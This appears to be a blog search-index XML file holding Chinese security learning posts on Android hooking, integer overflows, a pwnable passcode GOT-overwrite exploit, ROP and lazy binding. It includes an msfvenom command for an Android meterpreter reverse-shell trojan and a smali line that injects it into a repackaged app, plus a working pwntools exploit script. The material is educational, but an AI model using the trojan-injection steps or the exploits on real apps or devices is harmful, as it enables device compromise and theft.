<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[Hook技术初探]]></title>
    <url>%2F2017%2F11%2F20%2FHook%E6%8A%80%E6%9C%AF%E5%88%9D%E6%8E%A2%2F</url>
    <content type="text"><![CDATA[注：文中讲解的安卓Hook技术只有Java层级的Hook技术，并未涉及Native层级的Hook技术。 0x00 Hook是什么Hook，英文解释是钩子或挂钩，在windows系统和安卓系统中都有自己的一套事件分发机制，应用程序，包括应用触发事件和后台逻辑处理也是根据事件流程一步一步往下执行，而我们所说的钩子就是在事件传送到终点前截获并监控事件的传输，像钩子一样钩上事件，并且去处理一些我们需要让它去处理的事情，也就是有时候会说的劫持，也可以称为动态注入。 0x01 Windows下的Hook技术在Windows平台下Hook技术类似与中断机制，Hook机制允许应用程序拦截并处理Windows消息或者事件。Hook的适用范围也可分为线程钩子和系统钩子，其中系统钩子功能更加强大，能控制几乎所有Windows消息。Hook技术涉及到的两个重要的API是SetWindowsHookEx（安装钩子）和UnHookWindowsHookEx（卸载钩子）。 我们熟知的防火墙和防毒软件都运用到APIHook技术， 0x02 安卓Hook技术安卓上的Hook技术又称为安卓APIHook技术，这个技术也由来已久，是一种在操作系统未能提供所需要功能能情况下的特殊手段。Android系统的开发有两种模式：Linux搭的Native模式和虚拟机上的Java模式，所以对应的Hook技术也就分为Java层级的Hook和Native层级的Hook。但是由于在Java中可以使用native关键字对C/C++代码进行调用，但是在C/C++中却很难调用Java中的代码，所以一般情况下能够在Java层级完成的不会在Native层级去完成。 Hook技术说白了就是劫持函数的调用，但是由于处于Linux用户态，每个进程都有自己独立的进程空间，那么就必须先注入到所要Hook的进程空间，修改其内存中的进程代码，替换其过程表的符号地址。相应的在Android系统中一般是通过ptrace函数来附加进程，再向远程进程注入so库，从而能够监控并对远程进程进行挂钩。 0x03 手动注入技术的实现手动注入的实现还是很简单的，只是简单的将apk反编译后插入我们需要注入的代码即可，下面就拿上次在团队宣讲会上用到的一个简单的小例子，将一个从小米应用商店下载的apk利用msf生成的木马手动撸下来权限。 利用msf生成木马apk 使用下面的命令就能通过msf生成一个现成的木马apk： msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.169 LPORT=4444 R &gt; pentestlab.apk 反编译木马apk和目标apk，并修改smali代码 使用命令行或者集成工具都可以，反编译找出目标apk的程序起始点。先将目标apk反编译，在mianactivity里面通过OnCreate函数占到程序开始运行时对应的代码，然后在这里添加进一段代码，使得程序在启动时先启动木马apk，这样就可以get到需要的shell，添加的代码如下： invoke-static {p0}, Lcom/metasploit/stage/Payload;-&gt;start(Landroid/content/Context;)V 二次打包并签名 先将之前反编译出来的木马apk中的smali代码复制到目标程序的对应位置，再使用apktool进行二次打包并签名这样就完成一个手动注入恶意代码的过程。 由上面的图中可以看的更加清楚一些，在手动注入的操作中，或者说对于一些简单的安卓逆向，首先要将这个流程理清楚，才能再去了解一些细节性的东西。 0x04 安卓动态注入技术的原理从上面也可以看出，smail代码的篡改需要先反编译apk在重新打包，重打包后还需要重新签名，而我们使用的Java层级的Hook技术则可以解决这个问题，因为利用Hook技术我们可以把自定义代码注入到应用的进程空间，达到不修改代码却能修改控制代码的执行。 动态注入我们所需要关注的几个主要的函数有ptract函数，dlopen函数，mmap函数。ptract函数是Android内核中的一个系统函数，它可以完成动态跟踪一个目标进程（attach）、结束跟踪一个目标进程（detach）、获取内存字节（peektext）、向内存写入地址（poketext）等操作。内核中的另一个系统函数dlopen可以已制定模式打开制定的动态链接库文件。还有个mmap函数可以分配一段临时的内存空间来存放要注入的代码。 XPosed框架的介绍及原理 Xposed是一个开源的框架，在GitHub上都是有源码的，它的功能是在开机的时候完成对所有的Hook Function的劫持，在原Function执行的前后加上自定义的一些代码，从而实现对该应用的定制，利用xposed框架也可以很容易获取应用中的信息，如加密私钥，salt值等，这样我们不需要再去反编译分析密钥转换算法，加密机制，直接hook加密函数获取输入输出即可。 在Android系统中，应用的进程都是由Zygote进程孵化而来，Zygote进程在启动时会创建一个Dalvik虚拟机实例，每当它fork一个新的应用程序进程时，都会将这个Dalvik虚拟机实例复制到新的应用程序进程中去，从而使得每一个应用都有一个独立的Dalvik虚拟机实例。Zygote进程在启动的过程中还会将Java运行库加载到进程中，并注册一些Android核心类的JNI方法到前面创建的DAlvik虚拟机实例中去。因此Xposed选择对Zygote进程进行Hook就能够实现对系统上所有的程序进程Hook，也就是全局Hook。]]></content>
      <tags>
        <tag>hook</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[整数溢出漏洞原理及实例分析]]></title>
    <url>%2F2017%2F10%2F25%2F%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E6%95%B4%E7%90%86%2F</url>
    <content type="text"><![CDATA[注：文中代码除了最后两段来自泉哥的《漏洞战争：软件漏洞分析精要》，其余均来自姜晔大神的缓冲区溢出系列教程。 0x00 整数溢出基本原理整数溢出，其实是缓冲区溢出的一种特殊形式，和其他类型的缓冲区溢出的基本原理相同的，整数溢出形成也是因为将数据放入了比它小的存储空间导致的。 在计算机中，整数分为有符号整数和无符号整数，其中有符号整数会在最高位用0表示正数，用1表示负数，而无符号整数就没有这个符号位，所有位都是数值位。在这些整数中常见的类型有8位的单字节型（byte）和布尔型（bool），16位的短整形（short int）和32位的长整形（int）。 下面就是一个较为简单的整数溢出的例子： #include &lt;stdio.h&gt; int main() { int InputTest; unsigned short OutputTest; printf(&quot;InputTest:&quot;); scanf(&quot;%d&quot;, &amp;InputTest); OutputTest = InputTest; //造成整数溢出 printf(&quot;OutputTest:%d\n&quot;, OutputTest); getchar(); return 0; } 上面的这个示例程序实现的功能很简单，只是简单的将输入的长整型（int型）的变量复制给无符号的短整形变量（short int型），然后输出。因为将长整型数的长度是32位，放到比它本身小的的短整型数（16位）的存储空间中，因此就会构成溢出条件，那么也就会形成较为简单的整数溢出漏洞。 无符号的16位整数可以表示0~65535范围内的数值，那么我们就来测试一下对于这个程序分别输入65536、65536、65537，得出的结果都是什么： 可以看出，如果输入的数不超过65535时，程序都能正确的输出显示输入的数，但是当输入的数大于65535时，输出的结果就变得不正确，这就是溢出造成的结果，如果对溢出的数据进行精心构造，也就可以让程序按照我们的目的去运行。 0x01 动态调试初探溢出原理还是上面的那个程序，动态调试一波，搞一波事情，看看溢出的流程具体是如何实现。 使用OD载入，进行调试后找到main()函数里面，如下图位置： 当程序步过地址为0x0040103E的位置时，程序会运行，提示需要执行输入命令，这也就是scanf()函数的地方，通过分析栈中的参数可以看出，输入的内容实际是存放在地址为0x0019FF3C的位置上的，输入十进制的65535，也就是十六进制的0x0000FFFF,然后再来看一下栈空间里面变化： 从上图可以看到，输入的数据65535已经存储到刚刚的eax寄存器中，再向下执行程序： 从上图中可以看到下面还有一些操作：先是将地址为0x0040103E中的数据复制给cx，再下面两条语句是将cx的内容辗转复制给edx寄存器，而edx寄存器则作为下面printf()函数的参数。但是通过源程序可知这个参数是无符号整形，也就是十六位，所以下面的操作就是将其与0xFFFF进行与运算，进而清空前十六位中的数据而保留后十六位中的数据，也就是将我们输入的数据的高十六位截去，只输出低十六位的数据。因为我们之前输入的是0xFFFF，只有后十六位的内容，所以对其并没有影响，下面将输入的数据变大进行第二次尝试，输入65536： 从上面图中可以看出来，输入65536后地址0x0040103E中存储的数据变成0x00010000，这样的话，在edx和0xFFFF进行与运算时，它的前十六位就会被舍去，只剩下0x0000，这也就是为什么会输出0。 这就是一个简单的整数溢出过程。 0x02 常见的整数溢出类型常见的整数溢出主要由三类整数操作引起的：无符号整数的下溢和上溢、符号问题和截断问题。 无符号整数的下溢和上溢 无符号整数的下溢由于无符号整数没能识别负数造成的： BOOL fun(size_t cbSize) { if( cbSize &gt; 1024 ) { return FALSE; } char *pBuf = new char[cbSize-1]; // 存在溢出隐患 memset(pBuf, 0x90, cbSize-1); ... return TRUE; } 从上述的示例代码中，在new分配内存后，程序没有检测调用结果的正确与否，这样的话，如果cbSize是0的时候，cbSize就是-1，但是memset的第三个参数是无符号的类型的，那么-1将被看作是正的0xFFFFFFFF，这样系统是无法操作这么大的空间，程序也就随之崩溃。 无符号的上溢其实额和下溢并不是十分对立的两个问题，上溢的话就是由于在计算超过0xFFFFFFFF的加法时，会发生进位，从而导致结果并不是我们想要的结果。 BOOL fun(char *s1, size_t len1, char *s2, size_t len2) { if(len1 + len2 + 1 &gt; 1024) { return FALSE; } char pBuf = new char[len1 + len2 + 1]; if(pBuf == NULL) { return FALSE; } memcpy(pBuf, s1, len1); // 存在溢出隐患 memcpy(pBuf + len1, s2, len2); ... return TRUE; } 从上面的代码中我们可以看出，在调用之前也进行了相应的检测，但是却仍然存在整数溢出漏洞。因为len1和len2都是无符号整数，如果len1=8，len2=0xFFFFFFFF，那么len1+len2+1就等于8，也就是我们只是在new时给pBuf分配了8个字节的空间，但是下面的memcpy(pBuf+len1,s2,len2)却要将0xFFFFFFFF长的字符串复制到这个空间里，这样也就会造成程序的崩溃。 符号问题 符号问题也有三种情况：1）有符号整数和无符号整数之间的转化；2）有符号整数的运算；3）有符号数之间的转化。 个人觉得这类问题也就是因为符号问题，使得整数操作不能够到达原来既定的目的，结果不是所应得的结果，进而就会导致溢出。比如上面的例子将负的有符号整数存放在无符号整数的存储空间中，这样系统会将这个数看作是一个很大的正的无符号整数，从而使得被操作的数能造成溢出并达到我们的目的。 截断问题 截断问题，也就是上面第一个例子中的情况，大多是因为高位数的整数要复制或者填充到低位数的整数中，进而造成的溢出。 因为当定义一个变量时，它在内存地址中的存储空间也就相应的固定，如果要将一个高位数存放在它的存储空间，这个内存空间肯定是不够用的，又因为这个变量的大小只有这么大，所以输出的只能是这个变量大小存储空间上的数据，这样高位数比这个变量多出来的几位就无法输出，操作数不是按照程序预计的进行，那么输出的结果也就会错误。 其实这三种分类归结到底还是因为将太大的数放到不够大的空间导致的溢出现象，这三种类别的问题也是相互联系的，无符号整数的下溢和上溢是因为经过整数运算后截断问题，符号问题则是有可能是由整数运算引发的截断问题，说到底，还是因为计算机中有符号整数和无符号整数之间的转化以及一些不同数据类型导致会有整数溢出的发生。 0x03 整数溢出引出的问题上面也讲了一些整数溢出的原理性的东西，但是也不难看出，整数溢出很难发现，发现了造成溢出了却很难控制并为我们所利用，下面就讲一些能够运用整数溢出的地方。 整数溢出属于缓冲区溢出的一种，泉哥把它分为基于栈的整数溢出和基于堆的整数溢出，个人觉得分为引起栈溢出的整数溢出和引起堆溢出的整数溢出更好一些，虽说不是很学术，但是对于新手来说更容易理解一些。也就是我们往往就是会通过利用整数溢出来控制缓冲区溢出进而实现我们的目的。 总是感觉只是将整数溢出的原理有点不是很容易讲明白，下面就举两个泉哥书中的例子来说明一下这两种整数溢出的利用原理，通过实例来理清楚里面的运行机制。 下面是整数溢出引起栈溢出的示例代码： #include &quot;stdio.h&quot; #include &quot;string.h&quot; int main(int argc,char *argv) { int i; char buf[8]; //栈缓冲区 unsigned short int size; //无符号短整数取值范围：0~65535 char overflow[65550]; memset(overflow,65,sizeof(overflow)); //填充为“A”字符 printf(&quot;请输入数值：\n&quot;); scanf(&quot;%d&quot;,&amp;i); size = i; printf(&quot;size:%d\n&quot;,size); //输出系统识别出来的size数值 printf(&quot;i:%d\n&quot;,i); //输出系统识别出来的i数据 if(size&gt;8) //边界检查 return -1； memcpy(buf,overflow,i); //栈溢出 return 0; } 上述的示例代码的主要功能是下面的memcpy()函数的实现，就是overflow数组中前i位复制给大小为8的buf数组中，在复制函数前面还进行了一次边界检查，但是并不能阻止溢出情况的发生。假如输入的i大于65535且小于65544时，因为size变量是无符号短整形数，它就会发生类似于第一个例子中的截断溢出情况，绕过看着很安全的边界检查，这样造成栈溢出，进而获取栈的控制权，以及程序的控制权。 下面是整数溢出引起堆溢出的示例代码： #include &quot;stdio.h&quot; #include &quot;windows.h&quot; int main(int argc,char * argv) { int* heap; unsigned short int size; 无符号短整数取值范围i：0~65535 char *pheap1,*pheap2; HANDLE hHeap; printf(&quot;输入size数值：\n&quot;); scanf(&quot;&amp;d&quot;,&amp;size); hHeap = HeapCreate(HEAP_GENRATE_EXCEPTIONS,0x100,0xfff); if(size &lt;= 0x50) { size -=5; printf(&quot;size:%d\n&quot;,size); pheap1 = HeapAlloc(hHeap,0,size); pheap2 = HeapAlloc(hHeap,0,0x50); } HeapFree(hHeap,0,pheap1); HeapFree(hHeap,0,pheap2); return 0; } 由于对于堆溢出的原理不太擅长，就将泉哥书上的理解重复一下，上述代码中的unsigned short int整数类型，当它小于5时，比如size=2，size减去5会得到负数，但是由于unsigned short int 取值范围的限制导致无法识别负数，反而得到整数65533，最后分配到过大的堆块，从而导致溢出覆盖到对管理结构。]]></content>
      <tags>
        <tag>溢出漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[延迟绑定技术的利用]]></title>
    <url>%2F2017%2F08%2F15%2F%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A%E6%8A%80%E6%9C%AF%E7%9A%84%E5%88%A9%E7%94%A8%2F</url>
    <content type="text"><![CDATA[以pwnable中passcode为例 0x00 前言前一段时间写了一篇延迟绑定相关的文章，苦于只理解原理，不知道如何利用，所以写的东西有点生涩却又没有实例来佐证演示。现在能够理解passcode的门道，就写一篇文章来讲解一下延迟绑定的利用。 0x01 关于题目的源码源码如下： #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; void login(){ int passcode1; int passcode2; printf(&quot;enter passcode1 : &quot;); scanf(&quot;%d&quot;, passcode1); fflush(stdin); // ha! mommy told me that 32bit is vulnerable to bruteforcing :) printf(&quot;enter passcode2 : &quot;); scanf(&quot;%d&quot;, passcode2); printf(&quot;checking...\n&quot;); if(passcode1==338150 &amp;&amp; passcode2==13371337){ printf(&quot;Login OK!\n&quot;); system(&quot;/bin/cat flag&quot;); } else{ printf(&quot;Login Failed!\n&quot;); exit(0); } } void welcome(){ char name[100]; printf(&quot;enter you name : &quot;); scanf(&quot;%100s&quot;, name); printf(&quot;Welcome %s!\n&quot;, name); } int main(){ printf(&quot;Toddler&apos;s Secure Login System 1.0 beta.\n&quot;); welcome(); login(); // something after login... printf(&quot;Now I can safely trust you that you have credential :)\n&quot;); return 0; } 0x02 分析先来分析一下溢出点在哪，发现在welcome()函数和login()函数的里面的scanf()函数都没有在第二个参数前加上取地址符&amp;，这样导致程序会把输入的数据当成地址指针来处理，然后将读入的数据放到这个指针对应的地址上，这就是一个可以利用的地方。 我们先是选择用GDB这个工具来调试一下程序，发现在程序中main()函数中的welcome()函数和login()函数的esp指针都相同，这就说明其他们是在一个栈帧中运行的并没有分开运行（但是感觉他们又是只在同一个栈中而不是在同一个栈帧中，后续解决），这要的话他们的ebp应该就是相同的。 接着调试我们还是会发现因为这两个函数的ebp相同，所以这两个函数中的三个变量name（address=ebp-0x70）、passcode1（address=ebp-0x10）和passcode2（address=ebp-0xC）的相对地址是固定的，其中name和passcode1之间的距离是96个字节，但是程序给name初始化的数组大小是100个字节大小，因此我们可以通过name数组来操控passcode1的初始值。 上面说的scanf()函数的利用，下面展开讲解，先是反编译一下login()函数，如下图，发现在call这个函数之前会先压栈两个参数； 分别是先将ebp-0x10地址处的数据存放到esp+0x4处作为scanf()函数的第二个参数：地址表项 再将第一个参数，也就是输入的格式化字符串 既然这样，那借助scanf()函数和name数组，可以达到修改任意地址上数据的目的。 0x03 具体利用经过上面的分析，已经知道的是有scanf()函数可以利用，然后就是因为welcome()函数和login()函数ebp相同，于是name数组也可以得出溢出长度。找到了溢出点，也得出了溢出长度，还有就剩下返回地址。从程序的正常逻辑来看，只要使得passcode1=0x000528E6且passcode2=0x00CC07C9，这样就能运行system()函数，从而得到flag，但是发现并不能同时控制两个passcode。因此只能另辟蹊径，这里可以利用ELF的延迟绑定来实现我们的目的（延迟绑定的具体实现前参阅笔者前一篇文章）。 从上面的分析得出，我们利用scanf()函数和name数组可以修改任意地址上的数据，那么为什么不利用这两个条件去修改使得程序之间跳转去执行system()函数呢?有想法，就要做出具体的措施，我们利用延迟绑定的特点，修改某个函数在.got.plt表中的地址，这样就可以达到目的。 知道生面这些原理，接着就将这些东西都落实。这里我们选择利用printf()函数，所以我们可以使用objdump命令去获取该函数在.got.plt表中的数据，如下： 有了printf()函数的.got.plt表地址，还需要的就是system()函数的地址，这一题比较简单，直接就将system函数的地址泄露出来，这样也就不需要我们再去费心构建，可以直接反编译login()函数就可以得到，如下： 这样经过这些工作，我们需要的就都齐全了，接着就是构建exp： from pwn import * elf = ELF(&quot;passcode&quot;) r = remote(&quot;127.0.0.1&quot;,&quot;12345&quot;) #r = process(&quot;./passcode&quot;) printfGotAddr = elf.got[&quot;printf&quot;] systemAddr = 134514147 print &quot;the printfGotAddr is &quot;+ hex(printfGotAddr) print &quot;the systemAddr is &quot;+ hex(systemAddr) payload1 = &apos;a&apos; * 96 + p32(printfGotAddr) payload2 = str(systemAddr) r.sendline(payload1) r.sendline(payload2) print r.recv() 运行即可得到flag。 0x04 小结下面简单梳理一下整个过程： 按照程序的流程，先是在welcome()函数中输入100个字节大小的字符，但是从第九十七位起的末尾四位可以覆盖到passcode1的地址上去，而这个passcode1地址上存储的是下面一个scanf()函数的第二个参数地址表项，同时该参数前没有取地址符，因而可以通过这四个字节的字符去控制scanf()函数执行到目标地址，接着是scanf()函数的第一个参数也就是需要写入的数据，这里用system()函数的地址来替代，这样就能达到将printf()函数的.got.plt表中的地址替换成system()函数的地址，这样在下面再次调用printf()函数的时候，实际调用的就是system()函数，进而就达到目的了。]]></content>
      <tags>
        <tag>elf文件</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[读蒸米大神《一步一步学ROP之x86篇》笔记]]></title>
    <url>%2F2017%2F07%2F29%2F%E5%AD%A6%E4%B9%A0%E8%92%B8%E7%B1%B3%E5%B8%88%E5%82%85%E3%80%8A%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E5%AD%A6ROP%E4%B9%8Bx86%E7%AF%87%E3%80%8B%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[0x00 ROP及保护机制介绍 ROP全称是返回导向编程（Return-oriented programming），这是一种高级的内存攻击技术，可以用来绕过现代操作系统的各种通用防御。战战兢兢复制蒸米师傅的话，下面是我的浅显的理解：这也就是一种攻击手段，运用一些系统或程序存在的漏洞，通过ROP链作为桥梁进入到目标系统。再下面也主要是一些个人在读这篇文章并动手操作时遇到的问题及解决，如有错误，烦请指正。 我们可以利用栈溢出的漏洞进行攻击，那么系统开发及防御者也想处各种针对的方法，常见的有三种保护机制：堆栈不可执行（DEP/NX）、内存地址随机化（ASLR）和栈保护（Stack Protector）。 0x01 程序流劫持（Control Flow Hijack） 这是最基础的，将三种保护机制都关闭，让难度降到最低，首先就是使用几条命令在编译过程中就关闭这三种保护，使得我们只需考虑如何去利用漏洞，不必去考虑去绕过这些保护机制。 看到程序可以看出它有一个明显可以利用的栈溢出，就是它定义的buf是128个字节，但是read函数并不是只读取128个字节，所以可以利用buf去进行溢出攻击。下面通过内存出错的地址来得到要填充的大小位140个字节，其实也可以在调试程序的过程中使用gdb或者IDA来计算得到，后者只适合用来验证，或者理清原理，下面我们看看使用GDB调试的结果： 从图中我们可以看出，先是栈帧的初始化，栈帧大小是0x98,然后是将read函数的第三个参数256压栈，再是buf数组，大小为0x88，下面就是第一个参数。这里我们可以看到buf数组的起始地址是ebp-0x88，所以他到ebp的距离是0x88，也就是136个字节，再加上EBP本身的4个字节，所以我们要覆盖的也就是140个字节，也就是上面算出来的140. 知道溢出点，接着是shellcode的构建，这里还是有点捉摸不透，挖坑日后填。 下面的ret地址也可以使用蒸米师傅文中提到的方式获得，那我们来看看最后得到的payload的构造，payload=shellcode+’A’*(140-len(shellcode))+p32(ret)，在这个结构中，我一开始不知道为何这样编排，后来在仔细学习了解函数调用时栈结构后有所理解，先是返回地址压栈这个没啥疑问，就是为啥这填充字符长度为啥时140减去shellcode的长度，因buf数组到返回地址之间一共就是140个字节大小，而我们要执行shellcode也要存放在这140个字符大小的空间里，所以我们填充的字符就应该是140减去shellcode的长度。 稍微理一下思路：为什么会溢出？因为read()函数从STDIN_FIENO读取256个字节到buf，但是buf只有128个字节，因而会造成溢出，进而利用vulenerable_function()函数来执行shellcode来达到目的。 0x02 利用ret2libc技术绕过DEp保护 我们在编译过程中只把DEP保护开启就行，DEP就是堆栈不可执行，那么我们上面所用的payload就行不通，因为上面攻击方式的原理就是在栈上直接运行shellcode来夺取shell权限的，现在在对战中不能够执行函数，那么怎么办呢，我们可以利用程序的libc库中的其他函数，比如sysytem函数，就算其他所有函数都不能调用libc库中的函数也坑定是可以调用的。 首先需要用到的system函数地址，/bin/sh地址，我们也都可以通过蒸米师傅的文章中所述方式获得，那我们还是来看看这个payload，进而了解这个里面的实现过程。因为这里的堆栈不可使用，那我们可以利用libc库中的其他函数来实现，那我们要如何到这个我们调用的system函数的地方呢？我们可以相当于是在这个函数的的栈帧里面在构建一个system的栈帧，让程序直接跳转到system函数中去运行。我们看到的是先是140填充字符，然后在原来应该出现该函数帧基址EBP的位置上是system函数的地址，下面是返回地址，这个就不重要了，在下面是bin地址，最先压入，已经不再这个函数对应的栈帧中，所以这里是充当system函数的参数来使用的。那么在函数调用时，先是过了140个填充字符，接着就是system的返回地址，程序这会吧system当成这个栈中的一个栈帧，然后就去运行它，这样就正如我们所愿，得到shell权限，至于那个ret地址，无关紧要，我们不用去关心它在我们调用完shell权限后是否返回到正确的地址上去。 个人见解就是这种ret2libc的攻击方式就是利用函数调用时栈结构的一些弱点来实现自己的目的，就是既然不让我在栈上面运行，那我就直接将函数的调用转移到libc库中的函数去实现，这样不需要在堆栈上执行我照样能够拿到权限，达到我们的目标。还有一点感触就是，一定要对函数调用时栈的结构有足够的了解，不然很难去理解这些攻击手段背后的原理，即使知道套路，也就知识知道套路，并没有真正的为你所用。（装完逼了，该跑路了2333） 0x03 通过ROP绕过ASLR和DEP保护 这个就是在上一个的基础上让内存地址随机化，进而混淆我们视听，让给我们找不到真实的地址进行下一步的操作。 蒸米师傅的大体思路是：先leak出来的libc.so共享库中的函数在内存中的地址，然后根据这些地址通过计算相对偏移地址的方法来得到system和bin地址，这样又可以使用前面的ret2libc的攻击方法。这个攻击方式具体的实现是：我们利用出现程序中的libc库中的函数来计算system函数和bin在内存中的地址，原理是elf文件的延迟绑定技术（我也有一篇博客是讲解这个，可以参阅一下），将所有函数都绑定到got表中，这样他们之间的相对距离就是固定的，也就是能够通过计算得出我们想要的函数地址。但是看蒸米师傅的脚本还有有点懵，下面半部分就是我们上面所说的，但是它的上面部分还有点不理解玄妙，看来还是道行不够，需要继续努力了。 还有一点不明白的是，这个既然提到了延迟绑定，为啥不用ret2dlresolve技术呢?这个还没搞懂，接下来就是研究研究这个ret2dlresolve技术，也要将ROP中一些疑点逐一搞清楚。]]></content>
      <tags>
        <tag>PWN</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[学习ROP过程中对函数调用栈的感想]]></title>
    <url>%2F2017%2F07%2F25%2F%E5%AD%A6%E4%B9%A0ROP%E8%BF%87%E7%A8%8B%E4%B8%AD%E5%AF%B9%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88%E7%9A%84%E6%84%9F%E6%83%B3%2F</url>
    <content type="text"><![CDATA[最近在学习ROP技术，深深感觉到自身和大佬之间的差距，但是这并不能阻止我向大佬看齐的脚步。 在这个过程中，使用ROP来实现栈溢出，那么就需要很透彻的了解栈的结构，和函数调用栈的具体实现，查了很多资料，终于对函数调用栈的过程有较为清晰的认识。 首先栈是一个先进后出的数据存储结构，这个大家都知道，但是函数在调用栈的过程是怎样实现的呢？这就是我们今天需要解决的问题了。 也许来个图可以说的清楚点： 图中给出的是函数嵌套调用的栈结构图，上面部分是主调函数（Caller Function）的栈帧，下面部分是被调函数（Callee Function）的栈帧，EBP和ESP分别是栈帧的帧基址指针和栈顶指针，“m（%ebp）”表示以EBP为基址、偏移量为m个字节的内存中的内容。主调函数需要调用被调函数时，会先在自己的栈帧中预留一定的空间，然后压栈被调函数的n个参数，往下是主调函数自身的返回地址。再下面跟着的就是被调函数的栈帧，先是被调函数栈帧的帧基址EBP，然后是被调函数需要使用到的一些局部变量，最后是被调函数自身的返回地址。 看完函数的栈帧结构，我们再来看看函数调用时实现流程： 一般函数的调用都是嵌套调用，在主调函数调用被调函数时，先将被调函数的参数压入主调函数的栈帧，然后是主调函数的返回地址压栈，存放在EIP中，接着是被调函数的栈帧的初始化，压栈该栈帧的基地址EBP，再往上压栈的是被调函数中需要调用的一些局部变量，如果还有下一层被调函数，压栈其参数，否则跳过这步，最后压栈的就是被调函数自身的返回地址。然后在函数被调用结束后，先将被调函数的返回地址出栈，接着分别是被调函数的局部变量，被调函数的栈帧的基地址EBP，这样在将整个被调函数的栈帧出栈后，露出来的就是主调函数的ret，然后就可以返回主调函数对应的代码段去执行主调函数，这样就是一个函数调用的大概过程，来一张庆大佬的总结图吧（日常膜大佬，但是感觉如果倒着放会容易理解）： 补充两点： 为何在下面这张图中在main函数前还有函数？庆大佬的解释是前面还有一些每个程序在被装入内存前都会经历的操作（的确是还有这种操作2333） 所谓的栈帧初始化是什么？其实就是我们通过汇编代码进入一个函数看到的前三行代码，先将EBP值push存放，然后是将ESP赋值给EBP，然后是ESP减去栈大小，这样开辟出一块从EBP到现在的ESP的空间作为一个栈帧空间来使用，此时的ESP作为栈顶指针，一直指向栈顶，而EBP则是栈帧的基地址指针。]]></content>
      <tags>
        <tag>堆栈结构</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[延迟绑定技术及其实现]]></title>
    <url>%2F2017%2F07%2F12%2F%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A%E6%8A%80%E6%9C%AF%E5%8F%8A%E5%AE%9E%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[0x00 动态链接的优点动态链接库有较为明显的优势，主要是能节省内存，加快程序初始载入速度，方便对其进行管理，虽说也有在载入模块时更费时的缺点，但是却也瑕不掩瑜。而动态链接技术又有两种分类：Load-Time Relocation 和PIC动态库，但是前者因为不能够实现共享，所以已经很少提及，反倒是后者成为主流技术。对动态链接的浅显理解，如有不对，烦请指正。 0x01 延迟绑定延迟绑定属于PIC（位置无关）动态库的技术，是动态链接的一种机制，就是在程序需要该函数时在对其进行绑定调用，否则不需要去理会，这也就是动态链接能够较快载入的原因。而延迟绑定的大致流程就是： func@plt： #这是一个基本的plt项 jmp *(func@got.plt) push index jmp _init 这是一个最基本的plt项，也是延迟绑定的简单实现，它的具体实现还有其他的步骤组成。第一条指令就是跳转到该函数对应的got.plt表中去，如果不是第一次调用该函数，该函数已经被绑定到在got.plt 表中，这样跳过去就可以直接访问函数的真实地址（这里想起来前几天庆大佬给我说过的，这个地址只是一个逻辑地址，并不是物理地址，之前一直理解错了），但是如果是第一次调用，跳转过去的地方存放着它的下一条指令的地址，再跳回来，那么这条指令就失去功能了，也就相当于是直接从上面跳到下面。这第二条指令是push一个参数，其实也就是该函数在GOT表中对应的偏移量，这个参数是给下面的对应的函数使用。下面是第三条指令，又是一个跳转，这是跳到plt0，也就是plt表的公共项，然后再由plt0跳转到这个函数去实现符号重定位以及GOT表表项的修改，这也就是延迟绑定的简单实现流程。 0x02 实例实现延迟绑定上面大致的说了延迟绑定的实现过程，下面就用实例来实现一下延迟绑定的过程。 以下是用来实现的代码，其实很简单，只要写一段能够有调用到另一个函数的代码就好了,这是我在Bean_lee大佬的文章上盗来的代码（跟写代码很low的自己绝交两分钟）： test.c： int myglob = 42; int ml_util_func(int a) { return a + 1; } int ml_func(int a, int b) { int c = b + ml_util_func(a); myglob += c; return b + myglob; }olddriver： static int header_handler(struct dl_phdr_info info, size_t size, void data) { int j; printf(“name=%s (%d segments) address=%p\n”, info-&gt;dlpi_name, info-&gt;dlpi_phnum, (void)info-&gt;dlpi_addr); for ( j = 0; j &lt; info-&gt;dlpi_phnum; j++) { printf(“\t\t header %2d: address=%10p\n”, j, (void) (info-&gt;dlpi_addr + info-&gt;dlpi_phdr[j].p_vaddr)); printf(“\t\t\t type=%u, flags=0x%X\n”, info-&gt;dlpi_phdr[j].p_type, info-&gt;[j].p_flags); } printf(“\n”); return 0; } extern int ml_func(int, int); int main(int argc, const char* argv[]) { dl_iterate_phdr(header_handler, NULL); int t = ml_func(argc, argc); sleep(12); return t; }首先使用下面的第一条命令来将test.c编译成一个位置无关的动态共享库，然后再使用第二条指令将olddriver.c和前面生成的动态共享库进行链接，生成可执行文件olddriver用于下面的调试。 gcc -share -fpic -g test.so test.c gcc -o olddriver -g olddriver.c ./test.so 现在我们使用gdb+peda对olddriver进行调试： 我们知道olddriver调用了共享库中的ml_func函数，那首先来看看main函数： 从上面的函数中可以看到，main()函数在0x804871f对共享库中的ml_func函数调用，地址是0x80484e0，那么我们看看这个地址具体是什么，反编译如下： 我们可以看到这儿也就是上面说的plt的简单实现，如果不是第一次调用这个函数的话，那么0x804a010地址上的就应该是该函数的真实地址，但是我们可以看到的是这里的地址是0x80484d0的下一条地址，说明这个函数还没有绑定。 然后我们随着ml_func@plt一项一项往下看，第二项是将0x10push进去，这个就是该函数在GOT表中的相对偏移量，再往下第三项就是跳转到plt0去实现对函数的绑定，那我们来看看plt0： 从上面可以看到plt0的第一项也是push进一个参数，这个就是这个函数的相对地址，也就是在GOT表中的地址（注意，不是相对偏移量，是GOT表项对应的地址，这个用作下面判断是那个项需要进行绑定），然后发现它又跳转，挑来跳去，绑定一下真心不容易。既然它跳转了，我们再去看看它跳到那干啥去了，查看发现那啥都没有，这个地方困惑了很久，只知道这个地方是进行绑定的，但是却一直没有找到对应的函数，后来看到一篇文章，说需要先运行起来才能进行工作。 